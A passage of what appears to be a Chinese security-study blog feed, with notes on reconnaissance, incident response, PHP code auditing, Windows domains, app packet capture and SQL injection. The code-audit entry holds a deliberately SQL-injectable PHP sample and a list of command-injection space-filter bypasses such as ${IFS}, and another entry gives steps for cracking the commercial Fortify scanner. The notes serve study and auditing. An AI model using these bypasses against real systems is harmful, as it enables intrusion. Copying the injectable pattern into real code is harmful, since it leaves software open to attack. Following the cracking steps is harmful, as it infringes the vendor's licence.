<p>C段主机是指与目标服务器在同一C段网络的服务器，攻击目标的C段存活主机是信息收集的重要步骤，很多企业的内部服务器可能都会在一个C段网络中，在很难找到攻击目标服务器互联网漏洞的情况下，可以通过攻击C段主机，获取对C段主机的控制权，进入企业内网环境中，在企业内网安全隔离以及安全防护不如互联网防护健全的情况下，可以通过C段的主机进行内网渗透，这样可以绕过互联网防护机制，对目标进行攻击</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_56319791/article/details/127424861">https://blog.csdn.net/weixin_56319791/article/details/127424861</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应总结</title>
    <url>/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="PDCERF-国际权威应急响应流程"><a href="#PDCERF-国际权威应急响应流程" class="headerlink" title="PDCERF(国际权威应急响应流程)"></a>PDCERF(国际权威应急响应流程)</h2><p>PDCERF 方法论是一种防范使用的方法，其将应急响应分成六个阶段，分别是准备阶段、检测阶段、抑制阶段、根除阶段、恢复阶段、总结阶段。</p>
<p><img src="https://pic1.zhimg.com/v2-0be516bc34e75f8b7f249b989820e340_r.jpg" alt="preview"></p>
<span id="more"></span>

<p>入侵情景：</p>
<ol>
<li>网站页面遭到篡改、被挂暗链、黑链；</li>
<li>对外提供服务的服务器存在木马、挖矿软件、VPN等异常程序；</li>
<li>发现异常链接、cpu占用率飙升、服务器卡死；</li>
<li>安全软件检测到网内存在大量异常链接、占用带宽资源。导致单位无法正常上网；</li>
<li>dos大规模流量攻击；</li>
<li>安全监管部门检测发现该单位存在异常而被通告</li>
</ol>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/simon7s/p/12484155.html">https://www.cnblogs.com/simon7s/p/12484155.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/198443.html">https://www.freebuf.com/articles/web/198443.html</a></p>
<p><a href="https://www.wangan.com/wenda/2829">https://www.wangan.com/wenda/2829</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>fortify安装</title>
    <url>/2023/02/21/fortify%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://pan.baidu.com/s/1Jw7idUwlfMZwX4eTb-9luw">https://pan.baidu.com/s/1Jw7idUwlfMZwX4eTb-9luw</a> 提取：<strong>w6dn</strong></p>
<p>解压密码：<strong>shungg.cn</strong></p>
<span id="more"></span>

<h2 id="安装与破解"><a href="#安装与破解" class="headerlink" title="安装与破解"></a>安装与破解</h2><p>1.下载一路next，注意安装目录，默认为c盘</p>
<p>2.安装后取消选择最后一个选项 (关于更新软件的选项)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b0da108fb90d30c5cb7c9ea899c8a303.png" alt="img"></p>
<p>3.将安装包中的规则复制到安装目录Core\config\rules文件夹下</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7c1d90ba15b365d38deb562389c939a9.png" alt="img"></p>
<p><strong>破解</strong></p>
<p>将 jar 文件放入: “C:\Program Files\Fortify\Fortify_SCA_and_Apps_20.1.1\Core\lib” 目录 (默认安装位置)</p>
<p>然后转到 “C:\Program Files\Fortify\Fortify_SCA_and_Apps_20.1.1\bin&quot; 并打开 “auditworkbench.cmd”</p>
<p><strong>打开Fortify</strong></p>
<p>进入安装目录，打开bin文件夹，双击auditworkbench.cmd</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计总结</title>
    <url>/2023/02/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><h4 id="1-可控变量"><a href="#1-可控变量" class="headerlink" title="1.可控变量"></a>1.可控变量</h4><p>​	接收变量如：get,post </p>
<p>​	接收关键字：$_GET</p>
<h4 id="2-特定函数"><a href="#2-特定函数" class="headerlink" title="2.特定函数"></a>2.特定函数</h4><p>​	输出 print echo</p>
<p>​	数据库操作语句</p>
<h4 id="3-搜索特定关键字寻找特定漏洞"><a href="#3-搜索特定关键字寻找特定漏洞" class="headerlink" title="3.搜索特定关键字寻找特定漏洞"></a>3.搜索特定关键字寻找特定漏洞</h4><p>​	如：select、insert、update等sql执行语句 &#x3D;&#x3D;&#x3D;》sql注入漏洞 </p>
<p>​	如：搜索echo、print尝试挖掘xss漏洞</p>
<p>​	如：<code>$_GET</code>、<code>$_post</code>&#x3D;&#x3D;》数据包漏洞</p>
<span id="more"></span>

<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><ol>
<li>理解应用程序或系统的功能和架构。这有助于确定应该关注哪些部分的代码，并有助于识别潜在的安全漏洞。</li>
<li>寻找输入验证不足的漏洞。输入验证是应用程序或系统保护自身免受恶意输入的第一道防线。不正确的输入验证可能导致诸如SQL注入、跨站脚本（XSS）和跨站请求伪造（CSRF）等安全漏洞。</li>
<li>寻找敏感数据泄露的漏洞。这些漏洞可能导致应用程序或系统泄露敏感数据，如用户名、密码、信用卡信息等。</li>
<li>寻找授权和身份验证问题。这些漏洞可能导致未经授权的用户访问敏感信息或执行敏感操作。</li>
<li>检查代码是否存在逻辑错误。这些漏洞可能导致应用程序或系统的意外行为，例如未经授权的操作或意外数据泄露。</li>
<li>使用自动化工具辅助代码审计。有许多工具可用于自动化代码审计过程，例如静态代码分析工具和漏洞扫描器。但是，自动化工具不是万能的，它们通常只能检测一些常见的漏洞，并可能会误报或漏报漏洞。</li>
</ol>
<h2 id="php代码审计案例"><a href="#php代码审计案例" class="headerlink" title="php代码审计案例"></a>php代码审计案例</h2><p>假设有一个 PHP 程序，它使用 POST 请求从客户端接收用户名和密码，然后将它们存储在 MySQL 数据库中。在这个程序中，存在 SQL 注入漏洞，攻击者可以使用特定的输入值绕过应用程序的输入验证，从而获得对数据库的非授权访问。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password) VALUES(&#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在上述代码中，输入验证的缺失在于，应用程序直接将接收到的 <code>$_POST[&#39;username&#39;]</code> 和 <code>$_POST[&#39;password&#39;]</code> 值插入 SQL 语句中，而没有对它们进行任何过滤或转义。因此，攻击者可以通过在输入中插入 SQL 语句，从而获得对数据库的非授权访问。</p>
<p>要修复这个漏洞，可以使用预处理语句和参数化查询：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users(username, password) VALUES(?, ?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;User created successfully.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用预处理语句和参数化查询，应用程序会将输入值视为参数，而不是字符串。因此，即使攻击者尝试通过插入 SQL 语句来攻击应用程序，输入值也不会被视为 SQL 代码而被执行。</p>
<h3 id="php代码审计要点"><a href="#php代码审计要点" class="headerlink" title="php代码审计要点"></a>php代码审计要点</h3><ol>
<li>输入验证：验证输入数据的类型、长度、格式和范围，防止恶意用户提交非法输入数据。</li>
<li>访问控制：限制用户对应用程序中的资源的访问权限，防止未授权的用户访问敏感信息。</li>
<li>会话管理：确保会话ID的随机性和唯一性，验证会话数据的完整性和有效性，防止会话劫持和会话固定攻击。</li>
<li>数据库安全：避免SQL注入攻击，使用预编译语句和参数化查询来处理用户输入的数据。</li>
<li>文件上传：对上传的文件进行验证和过滤，限制上传的文件类型、大小和数量，防止文件包含漏洞和文件上传漏洞。</li>
<li>输出过滤：对输出到浏览器的内容进行过滤和转义，防止跨站脚本攻击和HTML注入攻击。</li>
<li>加密和解密：使用加密算法保护敏感数据的机密性，确保数据的完整性和可用性，防止加解密漏洞。</li>
<li>错误处理：避免敏感信息泄漏，将错误信息记录到日志中，提供有用的错误信息提示给开发者，防止信息泄露。</li>
<li>代码注释和文档：提供清晰的代码注释和文档，便于代码的维护和修改，防止代码混乱和漏洞。</li>
</ol>
<h4 id="trim-函数"><a href="#trim-函数" class="headerlink" title="trim() 函数"></a>trim() 函数</h4><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<p>一般是用来去除字符串首尾处的空白字符（或者其他字符），一般在用在服务端对接收的用户数据进行处理，以免把用户误输入的空格存储到数据库，下次对比数据时候出错。</p>
<h4 id="常见绕过空格命令分隔符"><a href="#常见绕过空格命令分隔符" class="headerlink" title="常见绕过空格命令分隔符"></a>常见绕过空格命令分隔符</h4><p>1、%0a符号：换行符</p>
<p>2、%0d符号：回车符</p>
<p>3、&lt; 号</p>
<p>4、%09符号</p>
<p>5、$IFS$9(数字无限制)符号</p>
<p>6、${IFS}符号</p>
<p>7、，号</p>
<p>8、&lt;&gt;号</p>
<p>9、$IFS符号</p>
<p>10、以及过滤掉的内容</p>
<h4 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord() 函数"></a>ord() 函数</h4><p>ord() 函数:返回字符串的首个字符的 ASCII 值。</p>
<h4 id="REQUEST、-POST、-GET的区别和联系"><a href="#REQUEST、-POST、-GET的区别和联系" class="headerlink" title="$_REQUEST、$_POST、$_GET的区别和联系"></a><code>$_REQUEST</code>、<code>$_POST</code>、<code>$_GET</code>的区别和联系</h4><ol>
<li><code>$_REQUEST</code></li>
</ol>
<p>PHP中，<code>$_REQUEST</code>可以获取POST方法和GET方法提交的数据，但是传输的速度相对较慢。</p>
<ol start="2">
<li><code>$_GET</code></li>
</ol>
<p>$_GET用来获取由浏览器通过$_GET方法提交的数据。<code>$_GET</code>方法就是通过把参数数据加在提交表单的action属性所指的URL中，值和表单内的每个字段一一对应，并且在URL中可以看到，但是同样也存在问题：</p>
<p>• 安全性差，在URL中可以体现</p>
<p>• 传输数据量较小，不能大于2KB。</p>
<ol start="3">
<li><code>$_POST</code></li>
</ol>
<p>$_POST用来获取由浏览器通过POST方法提交的数据。<code>$_POST</code>方法是通过HTTP POST机制，将表单的各个字段放置在HTTP HEADER内一起传送到action属性所指的URL中，用户看不到此过程。提交的大小一般来说不受限制，但是具体根据服务器的不同，略有不同，比如PHP版本5.512，默认POST最大值为3M，有的则为8M，IIS6默认最大则为200K。</p>
<p>相对于<code>$_GET</code>方法安全性稍高。</p>
<ol start="4">
<li>三者之间的区别和联系</li>
</ol>
<p><code>$_REQUEST</code>[“参数”]具有$_POST[“参数”]， <code>$_GET</code>[“参数”]的功能,但是<code>$_REQUEST</code>[“参数”]比较慢。通过$_POST和$_GET方法提交的所有数据都可以通过<code>$_REQUEST</code>数组[“参数”]获得。</p>
<h4 id="sql注入需要关注的关键字"><a href="#sql注入需要关注的关键字" class="headerlink" title="sql注入需要关注的关键字"></a>sql注入需要关注的关键字</h4><table>
<thead>
<tr>
<th>select from</th>
<th>数据库查询</th>
</tr>
</thead>
<tbody><tr>
<td>mysql_connect</td>
<td>数据库连接</td>
</tr>
<tr>
<td>mysql_query</td>
<td>数据库请求</td>
</tr>
<tr>
<td>mysql_fech_row</td>
<td>数据库请求</td>
</tr>
<tr>
<td>update,insert,delete</td>
<td>增删改</td>
</tr>
<tr>
<td>urldecode、rawurldecode</td>
<td>二次urldecode注入函数，比如我们提交id&#x3D;1%2527,webserver第一次解析式id&#x3D;1%27，urldecode第二次解析就会变成id&#x3D;1‘.造成单引号引入引发注入</td>
</tr>
</tbody></table>
<h4 id="xss输出函数关键字"><a href="#xss输出函数关键字" class="headerlink" title="xss输出函数关键字"></a><strong>xss输出函数关键字</strong></h4><table>
<thead>
<tr>
<th>print</th>
<th>输出字符串</th>
</tr>
</thead>
<tbody><tr>
<td>print_r</td>
<td>打印变量</td>
</tr>
<tr>
<td>echo</td>
<td>输出一个或多个字符串</td>
</tr>
<tr>
<td>var_dump</td>
<td>打印变量的相关信息</td>
</tr>
<tr>
<td>var_export</td>
<td>输出或返回变量中的字符串</td>
</tr>
<tr>
<td>die</td>
<td>函数输出一条消息，并退出当前脚本</td>
</tr>
<tr>
<td>printf</td>
<td></td>
</tr>
<tr>
<td>sprintf</td>
<td></td>
</tr>
</tbody></table>
<h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>直接搜索move_uploaded_file()，再去看调用这个函数的代码是否有上传格式校验措辞，以及校验措施是否可以绕过即可</p>
<h4 id="CSRF审计"><a href="#CSRF审计" class="headerlink" title="CSRF审计"></a>CSRF审计</h4><p>CSRF需要了解项目大致代码结构，找出和后台及核心模块相关的功能代码，然后查看是否有缺失token referer相关验证代码，然后黑盒判断不需要token和referer可以请求和返回同样的数据，则判断可能存在CSRF漏洞</p>
<p>1.后台功能模块：管理后台&#x2F;会员中心&#x2F;添加用户等。<br>2.被引用的核心文件里面有没有验证token和referer相关的代码<br>3.没带token：可以直接请求这个页面。<br>4.没带referer：返回相同的数据</p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/340873.html">https://www.freebuf.com/articles/web/340873.html</a></p>
<p><a href="https://blog.csdn.net/u014247926/article/details/127117877">https://blog.csdn.net/u014247926/article/details/127117877</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>内网基础</title>
    <url>/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><img src="/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png" alt="image-20230220133523195"></p>
<span id="more"></span>

<h2 id="相关基础概念"><a href="#相关基础概念" class="headerlink" title="相关基础概念"></a>相关基础概念</h2><h5 id="1-DMZ"><a href="#1-DMZ" class="headerlink" title="1.DMZ"></a>1.DMZ</h5><p>​		DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767?fromModule=lemma_inlink">防火墙</a>后外部网络的访问用户不能访问内部<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8/99096?fromModule=lemma_inlink">网络服务器</a>的问题，而设立的一个非安全系统与<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/3131501?fromModule=lemma_inlink">安全系统</a>之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571?fromModule=lemma_inlink">服务器</a>设施，如企业<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fromModule=lemma_inlink">Web服务器</a>、<a href="https://baike.baidu.com/item/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1926327?fromModule=lemma_inlink">FTP服务器</a>和<a href="https://baike.baidu.com/item/%E8%AE%BA%E5%9D%9B/158397?fromModule=lemma_inlink">论坛</a>等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
<p><strong>即在两个防火墙之间，内网之外的区域</strong>，<strong>可以大大增加攻击难度</strong></p>
<h5 id="2-工作组与域"><a href="#2-工作组与域" class="headerlink" title="2.工作组与域"></a>2.工作组与域</h5><p>​	<strong>工作组（Work Group）</strong>是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p>​	<strong>缺点：</strong>缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制。只适合小规模用户的使用。</p>
<p>​	如：学校宿舍，家庭网络</p>
<p>​	<strong>攻击手段</strong>：arp欺骗，dns劫持</p>
<p>​		<strong>注意：局域网攻击（如arp欺骗）并不适用于域</strong></p>
<p>​	<strong>域</strong>：用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
<p>​	<strong>域的功能和特点：</strong></p>
<ul>
<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
<li>便捷的资源访问，能够很容易地定位到域中的资源。 用户依次登录就可以访问整个网络资源，集中地身份验证</li>
<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
</ul>
<p>​	如：大超市，学校机房</p>
<p>​	<strong>工作组与域的区别：</strong>工作组是对等网络，域是B&#x2F;S架构，集中式管理</p>
<p><img src="https://img-blog.csdn.net/20181022145259655?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<h5 id="3-域控DC-Domain-Control"><a href="#3-域控DC-Domain-Control" class="headerlink" title="3.域控DC(Domain Control)"></a>3.域控DC(Domain Control)</h5><p>​		在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能应该要有至少两个域控。一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在DC中的。而有一台备份域控制（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。当域中的一台计算机安装了AD后，它就成了域控DC了。</p>
<p><strong>即一个域中最高管理权限，最高用户，最高管理的一台服务器，一般来说，拿下DC就意味着拿下域</strong></p>
<h5 id="4-活动目录AD-Active-Directory"><a href="#4-活动目录AD-Active-Directory" class="headerlink" title="4.活动目录AD(Active Directory)"></a>4.活动目录AD(Active Directory)</h5><p>​		活动目录AD是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有AD活动目录的服务器就是域控DC。</p>
<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
<p><strong>类似于策略组件，用于提供各种目录服务</strong></p>
<h5 id="5-域结构"><a href="#5-域结构" class="headerlink" title="5.域结构"></a>5.域结构</h5><p>​	<strong>单域</strong></p>
<p>​		在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
<p>​	<img src="https://img-blog.csdn.net/20181022150802375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:50%;"></p>
<p>​	<strong>父域与子域</strong></p>
<p>​		第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。父域与子域之间默认建立起了双向信任关系。</p>
<p>​	<strong>域树与域林</strong></p>
<h5 id="6-linux域与windows域"><a href="#6-linux域与windows域" class="headerlink" title="6.linux域与windows域"></a>6.linux域与windows域</h5><p>​		linux上也有相对应的活动目录，但是要装LDAP环境，一般企业很少会用LDAP来管理，因为功能上不及域强大，而且用linux来管理要求技术人员门槛高，故linux更适合做服务器，而windows更适合域，所以一般遇到的域是windows域，当然域中包含linux服务器也是很常见的。</p>
<h5 id="7-常用内网渗透流程"><a href="#7-常用内网渗透流程" class="headerlink" title="7.常用内网渗透流程"></a>7.常用内网渗透流程</h5><p>​		<strong>信息收集&#x3D;》权限提升&#x3D;》横向渗透&#x3D;》权限维持</strong></p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_44110913/article/details/106760045">https://blog.csdn.net/weixin_44110913/article/details/106760045</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title>app抓不到包解决思路</title>
    <url>/2023/02/19/app%E6%8A%93%E4%B8%8D%E5%88%B0%E5%8C%85%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="1-检测到模拟器环境"><a href="#1-检测到模拟器环境" class="headerlink" title="1.检测到模拟器环境"></a>1.检测到模拟器环境</h2><ol>
<li>将app安装到手机上</li>
<li>电脑和手机（模拟器）在同一个局域网</li>
</ol>
<p>​	3.burp抓手机的包</p>
<h2 id="2-app代理检测导致burp代理时无法正常访问"><a href="#2-app代理检测导致burp代理时无法正常访问" class="headerlink" title="2.app代理检测导致burp代理时无法正常访问"></a>2.app代理检测导致burp代理时无法正常访问</h2><p>​	使用 Postern-3.1.2.apk 工具，下载地址 <a href="https://github.com/postern-overwal/postern-stuff%EF%BC%8C%E5%B7%A5%E5%85%B7%E4%BD%9C%E7%94%A8%E6%98%AF%E5%B0%86%E4%BB%A3%E7%90%86%E7%BD%AE%E4%B8%BA">https://github.com/postern-overwal/postern-stuff，工具作用是将代理置为</a> vpn 代理绕过检测。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	抓不到包，尝试直接在手机上操作或者挂代理</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入总结</title>
    <url>/2023/02/11/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="一、SQL注入原理"><a href="#一、SQL注入原理" class="headerlink" title="一、SQL注入原理"></a>一、SQL注入原理</h2><ul>
<li>1.理解SQL注入<br> SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</li>
</ul>
<span id="more"></span>

<p>​	如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p>
<ul>
<li><p>2.sql注入的产生过程及常见原因 </p>
</li>
<li><ul>
<li>2.1产生过程<br> 大多数的web应用都需要与数据库进行交互，并且大多数<strong>web应用编程语言（如ASP、C##、.NET、Java和PHP）</strong>均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</li>
</ul>
</li>
<li><ul>
<li>2.2常见的sql注入产生原因<br> 基于此，SQL注入的产生原因通常表现在以下几方面：<strong>①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。</strong></li>
</ul>
</li>
<li><ul>
<li>2.2.1不当的处理类型<br> Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。<strong>因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。</strong></li>
</ul>
</li>
<li><ul>
<li>2.2.2不安全的数据库配置<br> 数据库带有很多默认的用户预安装内容。<strong>SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。</strong>这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令众所周知。<br>  这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</li>
</ul>
</li>
<li><ul>
<li>2.2.3不合理的查询集处理<br>   有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<strong>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</strong></li>
</ul>
</li>
<li><ul>
<li>2.2.4不当的错误处理<br> 错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。</li>
</ul>
</li>
<li><ul>
<li>2.2.5多个提交处理不当</li>
</ul>
</li>
</ul>
<p>​            大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。<br> 应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。<br> 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p>
